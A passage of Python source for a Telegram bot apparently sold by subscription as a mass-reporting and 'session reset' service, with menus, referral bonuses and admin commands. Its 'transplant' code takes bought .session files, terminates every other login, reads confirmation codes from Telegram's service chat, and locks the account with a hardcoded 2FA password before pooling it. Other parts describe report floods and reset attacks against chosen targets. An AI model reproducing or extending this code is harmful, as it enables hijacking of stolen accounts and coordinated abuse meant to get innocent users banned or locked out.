                 InlineKeyboardButton(text="\u0410\u043B\u044C\u0444\u0430", callback_data="bank:alfa")],
                [InlineKeyboardButton(text="\u0421\u0431\u0435\u0440", callback_data="bank:sber"),
                 InlineKeyboardButton(text="\u041E\u0437\u043E\u043D", callback_data="bank:ozon")],
                [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
            ]),
        )
        await state.set_state(Report.bank)
        await cb.answer()
        return
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>")
            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_reasons(),
    )
    await state.set_state(Report.reason)
    await cb.answer()


@router.callback_query(F.data == "back:methods")
async def back_methods(cb: CallbackQuery, state: FSMContext):
    await state.set_state(Report.method)
    await cb.message.edit_caption(
        caption=bq(f"<b>{NAME}</b>") + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_methods(),
    )
    await cb.answer()


@router.callback_query(F.data == "menu:refs")
async def menu_refs(cb: CallbackQuery, state: FSMContext):
    botRefCtx["bot"] = cb.bot
    users = load_users()
    rec = users.get(str(cb.from_user.id), {})
    refs = rec.get("refs") or []
    valid = await count_valid_refs_async(cb.from_user.id)
    grants = rec.get("ref_grants", 0) or 0
    total = len(refs)
    uname = cb.from_user.username
    me = await cb.bot.me()
    bot_uname = me.username
    # ссылка всегда с реферальным кодом приглашающего
    link = f"https://t.me/{bot_uname}?start=ref_{cb.from_user.id}"

    rules = (
        f"• Каждый брат по твоей ссылке попадёт в бот с меткой твоего кода <code>ref_{cb.from_user.id}</code>"
        + f"\n• Реферал зачитывается <b>только</b> если он подписан"
          f"\n  на канал"
        + f"\n• <b>{REF_BONUS}</b> подписавшихся по твоей ссылке = "
          f"<b>+1 день подписки</b>"
        + "\n• Бонус начисляется автоматически при проверке"
    )
    text = (
        bq(f"<b>{NAME}</b>  ·  Рефералы")
        + f"\n\n👥 <b>Приглашено:</b> {total}"
        + f"\n✅ <b>Зачитано (подписаны):</b> {valid}"
        + f"\n🎁 <b>Начислено дней:</b> {grants}"
        + f"\n⏳ <b>До следующего дня:</b> {max(0, REF_BONUS - (valid % REF_BONUS)) if valid else REF_BONUS} чел."
        + "\n\n" + bqe(rules)
        + "\n\n<i>Твоя ссылка:</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="📤 Поделиться ссылкой",
                             url=f"https://t.me/share/url?url={link}&text=Arch%20V3%20-%20жалобы%20и%20сброс%20сессий"),
    ], [
        InlineKeyboardButton(text="🔄 Проверить заново", callback_data="menu:refs"),
        InlineKeyboardButton(text="◀ Назад", callback_data="back:home"),
    ]])
    await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
                                  reply_markup=kb)
    await cb.answer()


async def refs_check_and_grant(cb: CallbackQuery):
    """Validated refs -> auto-grant bonus days (tier1) + tier2 deep-referral chain."""
    users = load_users()
    rec = users.get(str(cb.from_user.id), {})
    valid = await count_valid_refs_async(cb.from_user.id)
    grants = rec.get("ref_grants", 0)
    due = valid // REF_BONUS if valid else 0
    if due > grants:
        days = (due - grants)
        s, until = grant_ref_bonus(cb.from_user.id, days)
        rec["ref_grants"] = due

        # tier2 bonus: when one of your refs THEMSELVES invites 5 valid refs,
        # you get +1 extra day. Deep-chain boost.
        for rid in (rec.get("refs") or []):
            r2 = users.get(str(rid), {})
            if (r2.get("ref_grants", 0) or 0) >= 1 and not r2.get("_t2_credited", False):
                s, until2 = grant_ref_bonus(cb.from_user.id, 1)
                rec["deep_refs"] = (rec.get("deep_refs", 0) or 0) + 1
                r2["_t2_credited"] = True
                users[str(rid)] = r2
                try:
                    await cb.bot.send_message(
                        cb.from_user.id,
                        bq(f"🎁 <b>{NAME}</b>")
                        + "\n\n🌐 <b>Рефер 2-го уровня!</b>"
                        + f"\n<b>+1 дн.</b> за то, что твой пригл. сам привёл 5.",
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                break

        users[str(cb.from_user.id)] = rec
        save_users(users)
        state = "finished"
        await cb.bot.send_message(
            cb.from_user.id,
            bq(f"🎁 <b>{NAME}</b>") +
            f"\n\n\U0001f4e5 <b>+{days} дн. подписки начислено!</b>"
            + f"\nПриглашено валидно: <b>{valid}</b>"
            + f"\nПодписка активна до: <b>{until}</b>"
            + (f"\n🌐 Рефер 2-го уровня: всего {rec.get('deep_refs') or 0}" if rec.get("deep_refs") else ""),
            parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "menu:profile")
async def menu_profile(cb: CallbackQuery):
    u = cb.from_user
    username = u.username or "\u2014"
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    if s == "admin":
        sub_line = "\U0001f7e2 \u0430\u0434\u043c\u0438\u043d \u00b7 \u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
    elif s == "forever":
        sub_line = "\U0001f7e2 \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    elif s == "active":
        sub_line = f"\U0001f7e2 \u0434\u043e {until}"
    else:
        sub_line = "\U0001f734 \u043d\u0435\u0442 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438"
    text = (
        bq(f"<b>{NAME}</b>  \u00b7  \u041f\u0440\u043e\u0444\u0438\u043b\u044c")
        + f"\n\n\U0001f464 <b>{html_mod.escape(u.full_name)}</b>"
        + (f" (@{html_mod.escape(username)})" if username != "\u2014" else "")
        + f"\n\U0001f194 <tg-spoiler>{u.id}</tg-spoiler>"
        + f"\n\U0001f511 {sub_line}"
        + "\n\n\U0001f50c \u0434\u0432\u0438\u0436\u043e\u043a \u0430\u043a\u0442\u0438\u0432\u0435\u043d \u00b7 \u043e\u043d\u043b\u0430\u0439\u043d 24/7"
    )
    await cb.message.edit_caption(
        caption=text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
        ]),
    )
    await cb.answer()


@router.callback_query(F.data == "menu:info")
async def menu_info(cb: CallbackQuery):
    text = (
        bq(f"<b>{NAME}</b>  \u00b7  \u0418\u043d\u0444\u043e")
        + "\n\n\U0001f9f0 \u0420\u0435\u043f\u043e\u0440\u0442-\u0434\u0432\u0438\u0436\u043e\u043a \u0434\u043b\u044f Telegram: \u0436\u0438\u0432\u044b\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u044b, \u0432\u0435\u0431-\u0444\u043e\u0440\u043c\u0430, \u0441\u0431\u0440\u043e\u0441-\u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440.\n\n"
        + bqe(
            "\u2022 \U0001f4f1 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u2014 \u0436\u0430\u043b\u043e\u0431\u0430 \u043d\u0430 \u043a\u043e\u043d\u043a\u0440. \u043f\u043e\u0441\u0442\n"
            + "\u2022 \U0001f916 \u0411\u043e\u0442 \u00b7 \U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c\n"
            + "\u2022 \U0001f4e2 \u041a\u0430\u043d\u0430\u043b/\u0433\u0440\u0443\u043f\u043f\u0430 \u00b7 \U0001f3ad \u0421\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a\n"
            + "\u2022 \U0001f310 Web \u2014 \u0441\u044b\u0440\u044b\u0435 POST-\u0432\u044b\u0441\u0442\u0440\u0435\u043b\u044b \u0432 \u0441\u0430\u043f\u043f\u043e\u0440\u0442\n"
            + "\u2022 \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439 \u2014 SendCode + OAuth + 3 \u0436\u0430\u043b\u043e\u0431\u044b + \u043c\u043e\u043d\u0438\u0442\u043e\u0440\n"
            + "\u2022 \U0001f4bb \u041b\u043e\u0433-\u0444\u0430\u0439\u043b \u043f\u043e\u0441\u043b\u0435 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430"
        )
        + "\n\n<i>v3.1 \u00b7 \u043c\u0438\u043d\u0438\u043c\u0430\u043b</i>"
    )
    await cb.message.edit_caption(
        caption=text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
        ]),
    )
    await cb.answer()


# ── admin grant (only bog_archive) ──────────────────────
@router.callback_query(F.data == "menu:grant")
async def menu_grant(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await state.set_state(GrantFSM.uid)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>  ·  \U0001f511 Grant")
            + "\n\nПришли <b>ID пользователя</b>, которому выдаём подписку:\n"
            + "<i>например:</i> <code>8661362112</code>"
            + "\n\n(kwargs): отправь цифру, а следующим сообщением — кол-во дней.\n"
            + "Если вместо числа пришлёшь слово <code>forever</code> сроками — подпишу навсегда."
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(GrantFSM.uid)
async def grant_uid(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    if raw.lower() == "forever":
        await state.set_state(GrantFSM.days)
        await state.update_data(forever=True)
        await msg.answer(
            "✅ Подписка <b>навсегда</b> будет выдана — подтверди командой <code>yes</code>:",
            parse_mode=ParseMode.HTML)
        return
    try:
        uid = int(raw)
    except ValueError:
        await msg.answer("❌ Нужен числовой Telegram ID.")
        return
    await state.update_data(uid=uid)
    await state.set_state(GrantFSM.days)
    await msg.answer(
        f"📱 Пользователь <code>{uid}</code>.\n"
        + "Теперь отправь <b>кол-во дней</b> подписки (1 / 7 / 30 / 365 …):",
        parse_mode=ParseMode.HTML)


@router.message(GrantFSM.days)
async def grant_days(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("uid")
    forever = data.get("forever", False)
    raw = (msg.text or "").strip().lower()
    if forever and raw in ("yes", "y"):
        subs = load_subs()
        rec = subs.setdefault(str(uid), {})
        rec["forever"] = True
        save_subs(subs)
        await state.clear()
        await msg.answer(f"👑 <b>@{uid}</b> получил <b>навсегда</b>.", parse_mode=ParseMode.HTML)
        return
    try:
        days = int(raw)
        if days <= 0:
            raise ValueError
    except ValueError:
        await msg.answer("❌ Нужно целое положительное число дней.")
        return
    s, until = grant_ref_bonus(uid, days)
    await state.clear()
    await msg.answer(
        f"🔐 <b>@{uid}</b> получил <b>{days}</b> дн.\n"
        + f"📅 Подписка до: <b>{until}</b>",
        parse_mode=ParseMode.HTML)


@router.message(Command("unsub"))
async def cmd_unsub(msg: Message):
    """Remove a user's subscription: /unsub <uid>"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer("⛔️ Команда для админов.")
        return
    parts = (msg.text or "").split()
    if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
        await msg.answer("Формат: <code>/unsub 8864452428</code>",
                         parse_mode=ParseMode.HTML)
        return
    uid = str(int(parts[1]))
    subs = load_subs()
    if uid in subs and not uid.startswith("__"):
        gone = subs.pop(uid)
        save_subs(subs)
        state = "навсегда" if gone.get("forever") else f"до {gone.get('until')}"
        await msg.answer(
            f"❎ Подписка <b>{uid}</b> снята (была: {state}).\n"
            + "Доступ закроется при следующем действии в меню.",
            parse_mode=ParseMode.HTML)
    else:
        await msg.answer(
            f"⚠️ У <b>{uid}</b> активной записи нет — подписка не числится.",
            parse_mode=ParseMode.HTML)


@router.message(Command("wl"))
async def cmd_wl(msg: Message):
    """Target whitelist (BR-style): /wl add @name | /wl del @name | /wl list"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer("\u26d4\ufe0f \u041a\u043e\u043c\u0430\u043d\u0434\u0430 \u0434\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u043e\u0432.")
        return
    parts = (msg.text or "").split()
    if len(parts) < 2:
        await msg.answer(
            "\u0424\u043e\u0440\u043c\u0430\u0442:\n"
            "<code>/wl add @username</code>\n"
            "<code>/wl del @username</code>\n"
            "<code>/wl list</code>",
            parse_mode=ParseMode.HTML)
        return
    action = parts[1].lower()
    cur = _wl_load()
    if action == "list":
        if not cur:
            await msg.answer("\U0001f6e1 \u0411\u0435\u043b\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a \u043f\u0443\u0441\u0442.")
        else:
            body = "\n".join(
                f"\u2022 <code>{html_mod.escape(p)}</code>"
                for p in sorted(set(cur)))
            await msg.answer(
                f"\U0001f6e1 <b>\u0411\u0435\u043b\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a \u0446\u0435\u043b\u0435\u0439:</b>\n{body}",
                parse_mode=ParseMode.HTML)
        return
    if len(parts) < 3:
        await msg.answer("\u041d\u0443\u0436\u0435\u043d \u043f\u0430\u0442\u0442\u0435\u0440\u043d: <code>/wl add @username</code>",
                         parse_mode=ParseMode.HTML)
        return
    pat = parts[2].strip().lstrip("@").lower()
    if action == "add":
        if pat and pat not in [p.lower() for p in cur]:
            cur.append(pat)
            _wl_save(cur)
        await msg.answer(
            f"\U0001f6e1 <code>{html_mod.escape(pat)}</code> \u0432 \u0431\u0435\u043b\u043e\u043c \u0441\u043f\u0438\u0441\u043a\u0435.",
            parse_mode=ParseMode.HTML)
    elif action == "del":
        cur = [p for p in cur if p.lower() != pat]
        _wl_save(cur)
        await msg.answer(
            f"\u274e <code>{html_mod.escape(pat)}</code> \u0443\u0431\u0440\u0430\u043d \u0438\u0437 \u0431\u0435\u043b\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430.",
            parse_mode=ParseMode.HTML)
    else:
        await msg.answer("\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435. add / del / list")


@router.message(Command("refgive"))
async def cmd_refgive(msg: Message):
    """Manually credit valid referrals: /refgive <user_id> [count]"""
    if not (user_is_admin(msg.from_user.id)
            or (ADMIN_ID and msg.from_user.id == int(ADMIN_ID))):
        await msg.answer("⛔️ Команда для админов.")
        return
    parts = (msg.text or "").split()
    if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
        await msg.answer("Формат: /refgive 8864452428 [кол-во]",
                         parse_mode=ParseMode.HTML)
        return
    uid = str(int(parts[1]))
    n = 1
    if len(parts) > 2 and parts[2].lstrip("-").isdigit():
        n = max(1, int(parts[2]))
    users = load_users()
    rec = users.get(uid)
    if rec is None:
        await msg.answer(
            "⚠️ В базе нет " + uid + " — пусть юзер пискнет боту хотя бы раз.",
            parse_mode=ParseMode.HTML)
        return
    rec["ref_credit"] = (rec.get("ref_credit", 0) or 0) + n
    users[uid] = rec
    save_users(users)
    try:
        valid = await count_valid_refs_async(int(uid))
        left = 5 - (valid % 5)
        tail = "✅ зачтено всего: <b>" + str(valid) + "</b> / до дня: <b>" + str(left) + "</b>"
    except Exception:
        tail = "✅ зачтено — проверь в меню «Проверить заново»"
    await msg.answer(
        "🎁 <b>" + uid + "</b>: вручную +" + str(n) + " реф.\n" + tail,
        parse_mode=ParseMode.HTML)


# ── admin: add session (file | code, with 2FA) ───────────
@router.callback_query(F.data == "menu:addsess")
async def menu_addsess(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    sessions = load_sessions()
    alive_line = ""
    if sessions:
        alive_line = f"\n🧷 В пуле: <b>{len(sessions)}</b>"
    await state.set_state(AddSession.choose)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>  ·  ➕ Добавить сессию")
            + alive_line
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📄 Загрузить файлом",
                                  callback_data="addsess:file")],
            [InlineKeyboardButton(text="🧬 Пересадка (мойка BR)",
                                  callback_data="addsess:trans")],
            [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
        ]))
    await cb.answer()


@router.callback_query(AddSession.choose, F.data == "addsess:file")
async def addsess_file(cb: CallbackQuery, state: FSMContext):
    await state.set_state(AddSession.file)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>  ·  📄 Сессия файлом")
            + "\n\nПришли <b>.session документ</b>.\n"
            + "Файл сохранится в пул и закоммитится в репу (переживёт рестарты)."
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
        ]))
    await cb.answer()


@router.message(AddSession.file, F.document)
async def addsess_file_recv(msg: Message, state: FSMContext):
    doc = msg.document
    name = doc.file_name or "pasted.session"
    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
        await msg.answer("❌ Нужен документ <code>.session</code> до 5 МБ.",
                         parse_mode=ParseMode.HTML)
        return
    tg_file = await msg.bot.get_file(doc.file_id)
    base = Path(__file__).parent / "sessions"
    base.mkdir(exist_ok=True)
    dest = base / name
    await msg.bot.download_file(tg_file, dest)
    # quick liveness probe so the admin knows what landed
    from telethon import TelegramClient as _TC
    probe_api_id, probe_api_hash = API_ID, API_HASH
    ok, why = False, ""
    try:
        px = load_pin_proxies()
        client = _TC(str(dest.with_suffix("")), probe_api_id, probe_api_hash,
                     proxy=pin_for_session(dest.stem, px))
        await asyncio.wait_for(client.connect(), timeout=15)
        ok = bool(await client.is_user_authorized())
        why = "" if ok else "not authorized"
        try:
            await client.disconnect()
        except Exception:
            pass
    except Exception as e:
        why = type(e).__name__
    commit_file_to_repo(f"sessions/{name}", f"add session {name} (file)")
    await state.clear()
    await msg.answer(
        bq(f"<b>{NAME}</b>  ·  ✅ Сессия добавлена")
        + f"\n\n🧷 <code>{html_mod.escape(name)}</code> → пул"
        + f"\n🔌 проб: {'✅ живая' if ok else '❌ ' + why}"
        + f"\n📦 в пуле: <b>{len(load_sessions())}</b> сессий",
        parse_mode=ParseMode.HTML)


@router.message(AddSession.file)
async def addsess_file_wrongtype(msg: Message, state: FSMContext):
    await msg.answer("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0444\u0430\u0439\u043B.", parse_mode=ParseMode.HTML)


# \u2500\u2500 BR-style transplant: \u043C\u043E\u0439\u043A\u0430 \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u044B\u0445 \u0441\u0435\u0441\u0441\u0438\u0439 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
TRANSPLANT_DIR = Path(__file__).parent / "transplant"
ARCH_2FA_PW = "Arch-V3-2026"


@router.callback_query(AddSession.choose, F.data == "addsess:trans")
async def addsess_trans(cb: CallbackQuery, state: FSMContext):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await state.set_state(AddSession.trans)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438")
            + "\n\n\u041F\u0440\u0438\u0448\u043B\u0438 <b>\u0421\u042B\u0420\u0423\u042E \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u0443\u044E .session</b> (lolz \u0438 \u0442.\u043F.)."
            + "\n\u042F \u0441\u0430\u043C: \u043A\u0438\u043A\u043D\u0443 \u0447\u0443\u0436\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438, \u0437\u0430\u043F\u0440\u043E\u0448\u0443 \u043A\u043E\u0434,"
            + "\n\u043F\u0440\u043E\u0447\u0438\u0442\u0430\u044E \u0435\u0433\u043E \u0438\u0437 \u0434\u0438\u0430\u043B\u043E\u0433\u0430 \u0441 Telegram (777000) \u0432\u043D\u0443\u0442\u0440\u0438 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0430,"
            + "\n\u043F\u0435\u0440\u0435\u0441\u0430\u0436\u0443 \u043D\u0430 \u0447\u0438\u0441\u0442\u044B\u0439 \u0444\u0438\u043D\u0433\u0435\u0440\u043F\u0440\u0438\u043D\u0442 + \u043F\u0438\u043D \u0438 \u043F\u043E\u0441\u0442\u0430\u0432\u043B\u044E 2FA."
            + "\n\n\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043E\u0441\u0442\u0430\u043D\u0435\u0442\u0441\u044F \u0446\u0435\u043B \u043F\u0440\u0438 \u043B\u044E\u0431\u043E\u0439 \u043E\u0448\u0438\u0431\u043A\u0435."
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:home")],
        ]))
    await cb.answer()


async def _transplant_say(chat_id: int, text: str) -> None:
    try:
        if _BOT:
            await _BOT.send_message(chat_id, text, parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True)
    except Exception as e:
        log.debug("transplant say failed: %s", e)


async def _transplant_fail(chat_id: int, state: FSMContext, old, new,
                           new_file: Path, why: str) -> None:
    # flow already abandoned (admin pressed back) — clean objects only
    d = await state.get_data()
    for cl in (new, old):
        if cl:
            try:
                await cl.disconnect()
            except Exception:
                pass
    for ext in (".session", ".session-journal"):
        try:
            p = Path(str(new_file) + ext)
            if p.exists():
                p.unlink()
        except Exception:
            pass
    if not d.get("trans_active"):
        return
    await state.update_data(trans_active=False)
    await state.clear()
    await _transplant_say(chat_id,
        "\u274C \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u043E\u0440\u0432\u0430\u043B\u0430\u0441\u044C: <i>" + html_mod.escape(str(why)) + "</i>. "
        "\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u0446\u0435\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0441\u043D\u043E\u0432\u0430.")


async def _transplant_finish(old, new, new_name: str, old_stem: str,
                             state: FSMContext, chat_id: int,
                             had_2fa: bool, seller_pw: str) -> None:
    import shutil as _sh
    data = await state.get_data()
    if not data.get("trans_active"):
        return
    await state.update_data(trans_active=False)
    # 2FA: put ours on the account (replace the seller's if known)
    twofa_note = "\u2014"
    try:
        if had_2fa and seller_pw:
            await old.edit_2fa(current_password=seller_pw,
                               new_password=ARCH_2FA_PW)
            twofa_note = "\u0437\u0430\u043C\u0435\u043D\u0435\u043D\u0430 \u043D\u0430 \u043D\u0430\u0448\u0443"
        else:
            await old.edit_2fa(new_password=ARCH_2FA_PW)
            twofa_note = "\u043F\u043E\u0441\u0442\u0430\u0432\u043B\u0435\u043D\u0430 \u043D\u0430\u0448\u0430"
    except Exception as e:
        twofa_note = "\u26A0\uFE0F \u043D\u0435 \u043F\u043E\u0441\u0442\u0430\u0432\u0438\u043B\u0430\u0441\u044C (" + type(e).__name__ + ")"
    # log out the raw session and delete its files
    try:
        await old.log_out()
    except Exception:
        pass
    try:
        await old.disconnect()
    except Exception:
        pass
    raw_path = TRANSPLANT_DIR / old_stem
    for ext in (".session", ".session-journal"):
        try:
            p = Path(str(raw_path) + ext)
            if p.exists():
                p.unlink()
        except Exception:
            pass
    # move the fresh session into the pool
    try:
        await new.session.save()
    except Exception:
        pass
    try:
        await new.disconnect()
    except Exception:
        pass
    dest = SESSIONS_DIR / (new_name + ".session")
    try:
        tmp = getattr(new.session, "filename", None)
        if tmp and str(dest.resolve()) != str(tmp):
            _sh.move(str(tmp), str(dest))
    except Exception:
        pass
    fp = session_fingerprint(new_name)
    meta = {"app_id": fp["api_id"], "app_hash": fp["api_hash"],
            "device": fp["device"], "sdk": fp["system_version"],
            "app_version": fp["app_version"], "lang_pack": "",
            "lang_code": fp["lang_code"]}
    try:
        (SESSIONS_DIR / (new_name + ".json")).write_text(
            json.dumps(meta, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    commit_file_to_repo("sessions/" + new_name + ".session",
                        "transplant " + new_name + " (BR-style)")
    commit_file_to_repo("sessions/" + new_name + ".json",
                        "transplant " + new_name + " meta")
    await state.clear()
    ok, why = await _session_alive(dest, data.get("trans_px_new"))
    kicked_n = data.get("trans_kicked", 0)
    await push_send_log(
        "\u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438 (BR-\u043C\u043E\u0439\u043A\u0430)",
        ["\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
         + html_mod.escape(new_name) + "</code>",
         "\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b> | \U0001F510 2FA: " + twofa_note
         + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)",
         "\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
         + " | \U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439"])
    await _transplant_say(chat_id,
        bq(f"<b>{NAME}</b>  \u00B7  \u2705 \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
        + "\n\n\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
        + html_mod.escape(new_name) + "</code>"
        + "\n\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b>"
        + "\n\U0001F510 2FA: " + twofa_note
        + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)"
        + "\n\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
        + "\n\U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439")


async def _transplant_run(chat_id: int, raw_stem: str, state: FSMContext) -> None:
    import re as _re
    from telethon import errors as _terr, events as _tlev, functions as _tlf
    from telethon.tl.functions.auth import SendCodeRequest, SignInRequest
    from telethon.tl.types import CodeSettings

    raw_path = TRANSPLANT_DIR / (raw_stem + ".session")
    if not raw_path.exists():
        await _transplant_say(chat_id, "\u274C \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043D\u0435 \u043D\u0430\u0448\u0451\u043B\u0441\u044F")
        return

    async def guard() -> bool:
        d = await state.get_data()
        return bool(d.get("trans_active"))

    # \u2500 old client: the raw bought session, on its own pin
    fp_old = session_fingerprint(raw_stem)
    px_old = pin_for_session(raw_stem, load_pin_proxies())
    old = TelegramClient(str(raw_path.with_suffix("")), fp_old["api_id"],
                         fp_old["api_hash"], proxy=px_old,
                         device_model=fp_old["device"],
                         system_version=fp_old["system_version"],
                         app_version=fp_old["app_version"],
                         lang_code=fp_old["lang_code"])
    try:
        await asyncio.wait_for(old.connect(), timeout=20)
        if not await old.is_user_authorized():
            await _transplant_fail(chat_id, state, old, None,
                                   TRANSPLANT_DIR / "none",
                                   "\u0441\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u043D\u0435 \u0430\u0432\u0442\u043E\u0440\u0438\u0437\u043E\u0432\u0430\u043D\u0430 (\u043C\u0435\u0440\u0442\u0432\u0430)")
            return
        me = await old.get_me()
        phone_digits = str(me.phone or "").lstrip("+") or str(me.id)
        uname = ("@" + me.username) if me.username else "\u0431\u0435\u0437 \u044E\u0437\u0435\u0440\u0430"
        await _transplant_say(chat_id,
            "\U0001F9EC \u0421\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u0436\u0438\u0432\u0430: <b>" + uname + "</b> (<code>+" + phone_digits + "</code>)")
    except Exception as e:
        await _transplant_fail(chat_id, state, old, None,
                               TRANSPLANT_DIR / "none",
                               "\u043A\u043E\u043D\u043D\u0435\u043A\u0442 \u0441\u044B\u0440\u043E\u0439: " + type(e).__name__)
        return
    # \u2500 kick every foreign authorization (BR step 1)
    kicked = 0
    try:
        auths = await old(_tlf.account.GetAuthorizationsRequest())
        foreign = [a for a in auths.authorizations
                   if not getattr(a, "current", False)]
        for a in foreign:
            try:
                await old(_tlf.account.ResetAuthorizationRequest(a.hash))
                kicked += 1
            except _terr.FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 30))
                try:
                    await old(_tlf.account.ResetAuthorizationRequest(a.hash))
                    kicked += 1
                except Exception:
                    pass
            except Exception:
                pass
    except Exception as e:
        await _transplant_fail(chat_id, state, old, None,
                               TRANSPLANT_DIR / "none",
